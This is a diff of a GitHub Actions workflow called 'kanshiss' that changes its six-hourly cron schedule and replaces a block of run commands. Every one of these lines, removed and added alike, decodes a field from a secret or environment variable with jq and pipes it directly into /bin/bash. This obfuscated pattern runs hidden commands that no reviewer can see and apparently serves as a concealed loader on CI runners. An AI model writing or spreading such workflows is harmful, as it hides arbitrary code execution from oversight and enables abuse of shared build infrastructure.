@@ -1,10 +1,8 @@
 name: kanshiss
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '40 2/6 * * *'
-
+    - cron: '33 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -13,17 +11,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: kanshiss
         env:
-          jul358: ${{ secrets.jul358 }}
+          wkn5: ${{ secrets.wkn5 }}
         run: |
-          echo $jul358 | jq -r .z89 | /bin/bash
-          echo $mtk47495 | jq -r .diux76 | /bin/bash
-          echo $yoas9 | jq -r .jvwy61 | /bin/bash
-          echo $cgq800 | jq -r .nsko0551 | /bin/bash
-          echo $dwtwx5343 | jq -r .gzfwk71165 | /bin/bash
-          echo $uwo0909 | jq -r .bi763 | /bin/bash
-          echo $j85993 | jq -r .dzre1558 | /bin/bash
-          echo $ftgtn440 | jq -r .chhl87134 | /bin/bash
-          echo $i9928 | jq -r .vkb2023 | /bin/bash
-          echo $tros28 | jq -r .bech54131 | /bin/bash
-          echo $kkzu605 | jq -r .jh62794 | /bin/bash
+          echo $wkn5 | jq -r .srp59 | /bin/bash
+          echo $abap4 | jq -r .boady456 | /bin/bash
+          echo $zv58654 | jq -r .ai06173 | /bin/bash
+          echo $tc5127 | jq -r .uk589 | /bin/bash
+          echo $uutvi9452 | jq -r .qqr9 | /bin/bash
+          echo $bkab09 | jq -r .jxbiq580 | /bin/bash
+          echo $lsjwm3747 | jq -r .wg57 | /bin/bash
+          echo $itn9915 | jq -r .zb38 | /bin/bash
+          echo $gpwkn575 | jq -r .gavku7 | /bin/bash
+          echo $g8 | jq -r .tb2 | /bin/bash
+          echo $frtn9 | jq -r .je0 | /bin/bash
+          echo $bvnoj931 | jq -r .thx47 | /bin/bash
+          echo $vj4 | jq -r .pe52025 | /bin/bash
 
